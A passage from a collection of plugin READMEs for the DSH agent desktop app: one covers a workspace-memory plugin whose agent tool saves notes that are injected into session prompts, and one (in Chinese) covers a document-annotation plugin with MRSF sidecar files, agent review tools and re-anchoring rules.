| Ask the agent to remember something | Any session: "remember: …" → the agent calls `save_workspace_memory` |
| Automatic recall | Every session in the workspace gets its memory files injected into its system prompt |

Works in every built-in agent preset (Standard, PTC, Minimal, Creator): the tool is registered in the root composition, and global tools are visible to all presets unless a custom preset opts out with a `tools.restrict` allow list — add `save_workspace_memory` to that list if so.

## Installation

The package is plain JavaScript with no build step, so every install channel works:

```sh
# from npm (once published)
dsh plugin --profile desktop add dsh-workspace-memories

# straight from GitHub (no build script needed — sources ship as-is)
dsh plugin --profile desktop add github:lengfengng-tech/dsh-workspace-memories

# from a local checkout
dsh plugin --profile desktop add ./dsh-workspace-memories
```

Or use the GUI: sidebar **Plugins → Add plugin**, paste a package name, GitHub address, or absolute local path, then **Enable now**.

Uninstall: the Plugins page, or `dsh plugin --profile desktop remove dsh-workspace-memories`.

## Usage

- Open the **Workspace Memory** entry in the sidebar. The selector defaults to the workspace of the current session. **New file** creates a `.md` memory (the extension is added when missing); select a file to edit, save, or delete it.
- Tell the agent "remember: this project uses pnpm, not npm" — it writes a memory file that every session of the workspace (and the panel) sees immediately.
- Storage and layout are configurable: `storage: home` (default, DSH data directory, outside the project) or `storage: workspace` (inside the project at `directory`, default `.dsh/memory`).

## Important: start a new session after installing or upgrading

Tool registration takes effect immediately on the host, but **a model's visible tool list is assembled when each conversation turn starts**:

- If a session's current turn began *before* the plugin was installed or reloaded, that turn's tool declaration is stale. This is most visible in **PTC mode**, where the model reads a pre-generated TypeScript binding (`ToolArgsMap`) that does not yet contain `save_workspace_memory` — the model may conclude "there is no memory tool", or fall back to probing the tool by name through the code channel (which actually works, since dispatch goes through the live host registry).
- **The fix is simple: start a new session, or just send a new message after the current turn ends.** The next turn regenerates the tool declaration and `save_workspace_memory` appears normally — no probing needed.

Memory injection into the system prompt is attached when an agent is created (session start, resume after a restart, clear, or compaction); once attached, a session picks up changed memory files on its next step automatically.

## Data layout and safety

Two storage modes, chosen by the plugin's `storage` config:

| Mode | Memory location | Use it for |
|---|---|---|
| `home` (default) | `~/.dsh/workspace-memory/<workspace-key>/` — outside the project | Machine-local or sensitive notes: server configs, environment quirks, personal conventions |
| `workspace` | `<workspace>/.dsh/memory/` — inside the project | Team-shared memories meant to be committed alongside the code |

```
~/.dsh/workspace-memory/     # default memory store, one subdirectory per workspace
dsh-workspace-memories/        # this plugin
├── package.json             #   bundle manifest (dsh.bundle.patch + dsh.client)
├── cordis.patch.yml         #   plugin row declaration
├── index.js                 #   host: /api routes + prompt injection + the save tool
├── client.js                #   browser: sidebar entry + management panel
├── locale/                  #   panel copy (en, zh)
├── icon.svg
└── selftest.mjs             #   host-logic self-test: node selftest.mjs
```

Safety constraints: the browser panel can only address registered workspaces by `workspaceId` (no arbitrary host paths); file names are strictly validated (no path separators, `..`, whitespace, or control characters); one file is capped at 1 MiB; prompt injection truncates each file to 32K characters and caps at 20 files.

## Development

- Install with a `link:` dependency (local-path install does this): editing `client.js` hot-reloads in the page via the client HMR receiver; editing `index.js` (host code) requires a DSH restart to load the new module generation.
- Run the self-test: `node selftest.mjs` (mocks the plugin context; covers routes, prompt rendering, tool writes, and validation failures).
- Runtime checks: host entry `include:workspace-memory` should be `active`; the client slot `sidebar.panellist` should list a `workspace-memory` occupant; `save_workspace_memory` should appear in the tool list.

plugins.readme_text:
# @caihua/dsh-doc-review · DSH 文档批注台

在 DSH 里直接对方案文档**划词批注**，批注落盘成 sidecar 文件，Agent 用 `doc_review_*` 工具读批注改稿，改完回标状态。

## 30 秒装上

两个办法，任选一个。

**办法一：让你 DSH 里的 AI 自己装（推荐）**

把下面这句话整段发给你自己 DSH 会话里的 AI：

> 帮我装一个 DSH 插件：`github:caihua8669/dsh-doc-review`。
> 装到桌面端正在用的那个 profile（不是 web），用桌面端自带的 CLI（`resources/runtime/cli/bin/dsh.cmd`）执行 `plugin --profile <profile名> add github:caihua8669/dsh-doc-review`。
> 装完确认三件事：①命令退出码为 0；②该 profile 的 `package.json` 里 `dependencies` 与 `dsh.profile.bundles` 都出现了 `@caihua/dsh-doc-review`；③`GET http://127.0.0.1:19387/api/dsh-doc-review/ping` 有响应（说明宿主半边挂上了）。最后刷新页面，确认会话页顶部页签栏出现「批注」。

**办法二：自己敲一行**

```bash
# 桌面端自带的 CLI；profile 名换成你正在用的（桌面端通常是 desktop）
dsh plugin --profile desktop add github:caihua8669/dsh-doc-review
```

装完刷新页面，会话页顶部页签栏里会出现「批注」。

**要求**：DSH 桌面端（或任意 profile）+ Node 20 以上。不需要构建，仓库里带的就是能直接跑的 `lib`。

## 它解决什么

以前的改稿回环：把段落复制到聊天窗口 → 下一行写建议 → 发出去。批注台把这一步改成：**在文档上划词 → 旁边写意见 → 点「交给 AI 改稿」**，Agent 拿到的是带行号、带原文引用、带作者与状态的结构化批注，不再丢上下文。

对话划词菜单的「添加到对话」在输入框插入原生引用徽章。发送时记录来源会话和完整选文，引用中的结束标记按原文保留。插件通过 DSH 的 `conversation.chat.node` 消息槽位显示可展开、可收起的引用徽章，刷新后从历史消息恢复，无需重建或替换桌面应用。普通消息继续使用宿主渲染器；停用插件后引用仍保留为带来源的文本。这里支持展开原文，暂不定位到来源消息。

## 界面在哪

DSH 会话页顶部页签栏里的 **「批注」**（与「对话轨迹」「上下文」「白板看板」并列）。三栏：

- 左：**按优先级列文档**。标题条右侧两个图标按钮切换视图（目录树 ⇄ 平铺，本机记忆选择）；
  结果行上是「N 篇」计数（详情挂在悬浮）加「范围」下拉——展开后选三档，末项是「重扫并刷新」：
  - **相关**（默认）：两层优先级，不扫文件夹全量。
    - 第一层「本会话产出 / 编辑」：这个会话里 agent 真正 read / write / edit 过的文档，加上 `deliverables/presented`（交付给你的文件）与 `agent/inbox/spliced`（子代理产出，子代理写的文档只在这里出现）。条目上标「产出 / 编辑 / 读过」，时间显示的是**会话里最后一次动它的时间**，并用它排序（比文件 mtime 更贴近「会话里最新那篇」）。
    - 第二层「本项目其它会话碰过」：同一工作区里**最近 15 个会话**（可配 `projectSessions`）碰过的文档并集，去重后按文档改动时间倒序。标「本项目」，悬浮显示来自几个会话。这一层回答的是「这个项目里被工作过的文档」，不是 `C:\业务\其他` 那 5,494 篇全量。
    - **有搜索词时**改在项目文件夹里全量找（否则只搜得到已经碰过的那几篇），提示行会写「搜索：项目文件夹全量」。
  - **工作区**：会话 cwd 下的全部 md（想翻整个文件夹时用）。
  - **全库**：配置 `roots`（缺省 `C:\业务`）下的全部 md，**24,856 篇**（深度不限，实测扫完 1.6 秒）。
  - 两层都空时，自动放宽到「工作区」并在提示行标注原因，不会给你一个空列表。
  - **层间不混排**：本会话的永远在最前，层内才按时间/待处理排；结果行右侧另一个按钮切「按最近 ⇄ 按待处理优先」。
  - 列表项显示相对时间（今天 16:20 / 昨天 09:05 / 08-29 14:00）、待处理条数与批注总数。底部输入框可直接粘绝对路径。
  - 返回给界面的始终是「最新 400 篇」（搜索时是命中的最新 400 篇）；批注数只挂在这 400 篇上算，所以「待处理优先」是在最近 400 篇里的排序。
  - 缓存：全库/工作区扫描 5 分钟，本会话转写 20 秒（会话进行中一直在长），本项目聚合 10 分钟。真实数据实测：本工作区 205 个会话 / 140MB 转写，取最近 15 个会话解码 + 合并统计共 **311ms**。
  - 会话碰过的文档即使不在 `roots` 里（比如插件源码、`~/.dsh/skills` 下的文件）也允许打开与写批注；没被碰过的域外路径仍然拒。
  - **踩过的坑（2026-10-11）**：①`getConfig()` 里曾写死 `Math.min(disk.maxDocs, 5000)`，把配置的 60000 静默压成 5000；叠加 `maxDepth: 9`，全库只扫到 7,960 篇（约三分之一）。现在钳位上限放到 200000 / 64 层。②**一个会话目录里可能有多份转写**（`session.jsonl.zstd` / `session.v3.jsonl.zstd` / `session.v4.jsonl.zstd`…），旧版文件按字母序排在前面；曾用 `files.find()` 取第一个 ⇒ 读到几个月前的旧转写，会话最近做的事全看不到（实测 `session-7c58dbd2`：v3=9/23 旧稿 306 次引用 vs v4=今天 519 次；修好后该会话第一层从 3 篇变 15 篇）。现在会把该目录下**所有**转写合并（同一路径累加次数、取较晚的发生时间），第二层按会话取最新那一份以省时间。
  - 回归断言覆盖上述两条（`test/scan-coverage.mjs` 对数量、烟测第 [15] 组对多转写）。
- 中：Markdown 正文（标题/段落/列表/表格/引用/代码块/分割线/行内强调）。**选中任意文字**弹出批注框，`Ctrl+Enter` 保存。
  - 批注框默认贴在**选区上方**（下沿离选区留 10px），上方放不下（选区在视口顶部 170px 内）才落到选区下方；横向与选区左沿对齐并夹在视口内——**任何情况下都不压住选中的文字**。定位算法抽成纯函数 `floatPlacement(rect, vw, vh)`，有 8 条断言。
  - 弹框抢走焦点后浏览器原生选区会变淡，所以用 CSS Custom Highlight（`::highlight(dr-pending)`）把选区持续标黄，并在框内显示所选文字前 28 字，避免「改着改着忘了选的是哪段」。
- **建议模式（改稿默认走这条路）**：AI 不再直接改文件，而是先用 `doc_change_propose` 登记改动提案（`quote` 原文 → `after` 新文 + `note` 为什么），落 `<文档目录>/.dsh-review/<文件名>.proposals.json`。**登记时文件一个字都不动**；用户在「批注」页的「待审改动」面板逐条 接受/拒绝（可填拒绝原因），**接受那一刻才真正写文件**，并按 `quote` 重新定位（文档后来被别人改过也能对上；原文彻底找不到就一个字都不写并说明是哪几条对不上）。受影响的段落在正文里会挂一条**内联预览**（红=原文、绿=拟改）+ 就地接受/拒绝按钮。
- 右：批注卡片（飞书式），底部是整篇级意见。
  - 卡片：#序号 / 行号 / 状态 / 原文引用 / 意见，可 已处理·退回·删除；自己写的批注可「编辑」（记 `x_updated_at`）。
  - **回复串**：每条批注下可来回回复（回车发送）；AI 的 `doc_review_reply` / `doc_review_resolve` 回填也追加进同一串，不覆盖上一条。
  - **双向联动**：点卡片，正文滚到锚点并加深高亮；点正文里的高亮，右栏滚到对应卡片。锚点用 CSS Custom Highlight 精确标到划词原文（`dr-anchor` / `dr-anchor-active`），不再整块染色。
  - 已处理的批注折叠进「已解决 (n)」，点开才展开；激活一条已处理批注时自动展开。
  - 正文右侧有一条位置轨（`dr-rail`），每条批注一个点，点了直接跳过去。
  - 快捷键按平台显示：Mac 是 `⌘↩` / `⇧⌘M`，其它平台是 `Ctrl+Enter` / `Ctrl+Shift+M`（后者把焦点送回批注框）。
- **会话批注**：在**正常对话界面**里选中一段文字，选区旁边会出现一条小工具条（批注 / 复制 / 划词提示词 / ⋯），点「批注」写意见即可——不用占用对话输入框，也不用把整段贴进来。落盘在 `~/.dsh/doc-review/session-notes/<sessionId>.json`，`doc_review_list` 之外的 `session_note_list` / `session_note_resolve` 负责给 agent 读与回标。
  - **保存即写进聊天输入框（攒批发送）**：保存后批注以 `【批注 · 请逐条回应】…【批注结束】` 的块追加进当前会话的输入框草稿，并保持焦点。可以连着划好几段逐条保存，块会**整体重算**（不会攒出两个块），你写在块下方的问题原样保留，攒够了一次回车发出。依据：GitHub pending review 的官方理由就是"别让 AI 在你没写完之前就按单条开工"。
  - 输入框是斜杠命令（`/…`）时不动它，只落盘；批注被处理/删除后再同步会把块自动摘掉。
  - 输入框走 `ctx.get('conversation').input.for(sessions.scope(sessionId))`（`.state.getSnapshot().draft` / `.setDraft()`）。**用 `ctx.get` 取而不声明依赖**：服务拿不到就只落盘、不碰输入框，绝不让客户端条目挂掉（v0.5.0 那次 boot 崩溃的教训）。抽出的纯逻辑有 16 条断言（`test/composer-block.mjs`）。
  - 为什么是「先出按钮再点开」而不是像文档那样直接弹框：对话里选文字经常是为了复制，直接抢弹框会烦。文档视口内仍是直接弹。
  - 「批注」页左栏顶部有「本会话批注 (待处理数)」区，可逐条 已处理 / 退回 / 删除，或一键「交给 AI」把这一批发给当前会话。
  - 浮层挂在 `shell.overlay` 插槽（全局，独立于「批注」页签），所以选中文字时人在哪儿都行。
  - **划词提示词**：工具条上「复制」之后直接列出前 3 个提示词（默认「翻译」「解读」），其余收进「⋯ → 更多提示词」。默认点击后将「提示词 + 选中文字」插入当前会话输入框；可在管理弹窗为单条提示词开启自动发送，但仅当输入框原本为空时提交，有草稿时只插入并提示确认。模板里用 `{{text}}` 指代选中文字，不写就附在末尾。
  - 管理入口在工具条末位：提示词不超过 3 个时是一个「编辑提示词」图标，点一下直接打开弹窗；超过 3 个时才变成 ⋯ 菜单（放不下的提示词 + 底部「管理提示词…」）。弹窗里可增删改、上移下移、恢复默认；缺名称或内容的行保存时忽略。提示词存本机 localStorage（键 `dsh-doc-review.prompts`），最多 30 条。
  - 工具条、菜单、弹窗、提示条按 DSH 官方 Menu / Modal / Button / Toast 规格写，颜色只用宿主 `--dsw-*` 变量，深色主题自动跟随。

工具条三个动作：

- **交给 AI 改稿 (n)**：把待处理批注组装成指令，直接往**当前会话**排队一条消息（`remote.session.prompt`），切回对话页就能看它逐条改。
- **复制指令**：同样的内容进剪贴板（remote 面不可用时自动降级为复制）。
- **刷新正文**：重新读盘。

## 数据落在哪

跟着文档走，Obsidian 不索引点开头目录：

```
<文档目录>/.dsh-review/<文件名>.review.json   结构化真源（MRSF / Sidemark 形状）
<文档目录>/.dsh-review/<文件名>.review.md     人读 / 别的工具读的导出
```

`.review.json` 落盘格式对齐 **MRSF v1.0（Markdown Review Sidecar Format，sidemark.org）**：

| 字段 | 含义 |
|---|---|
| `id` / `author` / `timestamp` | 批注身份 |
| `text` / `resolved` | 意见正文、是否已处理 |
| `line` / `end_line` | 1 基源码行号 |
| `selected_text` | 划词原文（**权威锚点，任何情况下都不改写**） |
| `selected_text_hash` | `sha256:...` |
| `anchored_text` | 重锚后实际命中的文本；空串 = 已失锚 |
| `reply_to` | 回复串：每条回复是独立条目，`reply_to` 指向父批注 id |
| `x_status` / `x_reply` / `x_resolved_at` / `x_updated_at` / `x_created_at` / `x_role` | 本插件私有状态（MRSF 的 `x_` 扩展位）；`x_role` 区分回复来自用户还是 AI，`x_reply` 只留最后一条 AI 回复做兼容 |

为什么不自创格式：MRSF 已有 `@mrsf/mcp`、`@mrsf/cli`、VS Code 扩展等消费方，字段语义也写死了重锚规则（§7.4 / §8）。

## 锚点怎么保持有效

锚点**打在 .md 源文本上**，不是渲染后的 DOM 偏移：渲染时把源码行号写进每个块的 `data-ls` / `data-le`，划词时反查行区间。

文档被改过之后，打开文档那一刻按 MRSF §7.4 的重锚四步重新定位：**精确匹配 → 多命中按旧行号就近消歧 → 空白归一化再匹配 → 都失败标「已失锚」但保留**。孤儿批注绝不静默删除，也不做假锚定（行号保持原值，卡片上挂红色「已失锚」）。

## Agent 侧工具

| 工具 | 用途 |
|---|---|
| `doc_review_list` | 读批注。给 `doc` 读单篇；不给则巡检配置根目录下所有带批注的文档。返回行号区间 + 原文 + 意见 |
| `doc_review_resolve` | 改完标记已处理，可回填一句「改了什么」（追加进该批注的回复串，用户和同事都能看到） |
| `doc_review_reopen` | 改得不满意，退回待处理 |
| `doc_review_reply` | 在某条批注的回复串里追加一条 AI 回复（解释做法、追问），不改状态 |
| `doc_change_propose` | 建议模式：登记改动提案（`quote` → `after` + `note`），不动文件 |
| `doc_change_list` | 查看待审提案；不给 `doc` 则巡检所有带提案的文档 |
| `doc_change_decide` | 接受（此时才落盘，按原文重新定位）/ 拒绝（带原因）/ 退回待审 |
| `session_note_list` | 读会话批注（对话消息上的划词意见） |
| `session_note_resolve` | 会话批注 已处理 / 退回 / 删除 |

### `/doc-review` 技能相关工具（规则沉淀 + 预审）

装插件时自动在 `~/.dsh/skills/doc-review/SKILL.md` 落一份技能文件，skill-filesystem 自动发现，用户可用 `/doc-review` 调用。初始规则库 `~/.dsh/doc-review/rules.json` 为空；所有规则都来自用户历次批注的提炼，插件不自带任何通用规则。

| 工具 | 用途 |
|---|---|
| `doc_review_history` | 跨项目聚合所有历史批注，给技能做共性提炼 |
| `doc_review_mine_candidates` | 从历史里挖反复出现 ≥3 次 / ≥2 篇文档的意见模式作为**候选规则**（manual 粒度，用户入库前可换成启发式）|
| `doc_review_rules_list` | 列规则库（含 candidate/active/deprecated）+ 自动健康检查（拒绝率、修改占比、90 天未命中）|
| `doc_review_rules_add` | 加规则。detect.kind：regex / line_length / para_lines / heading_level / manual |
| `doc_review_rules_update` | 改规则（status 变更 / 字段修改）|
| `doc_review_rules_remove` | 删规则（想保留历史痕迹改用 update 置 deprecated）|
| `doc_review_preview_apply` | 读 active 启发式规则，扫一篇文档，把命中结果挂进 `doc_change_propose` 待审改动（用户在批注页逐条 ✓/✗，这些 ✓/✗ 决定规则的 accept/reject 统计）|

**自我进化闭环**：批注（手打反馈） → `mine_candidates`（提炼候选） → `rules_add`（固化成规则） → 打开新文档时 `preview_apply` 做预审 → 用户 ✓/✗（强化/弱化规则） → `rules_list` 健康检查自动降级坏规则 / 建议细化。

**"交给 AI 改稿"的 prompt 现在额外带一句**：处理完批注后请调 `doc_review_mine_candidates`，发现 ≥3 条同质就提醒用户固化为规则。没发现就不打扰。
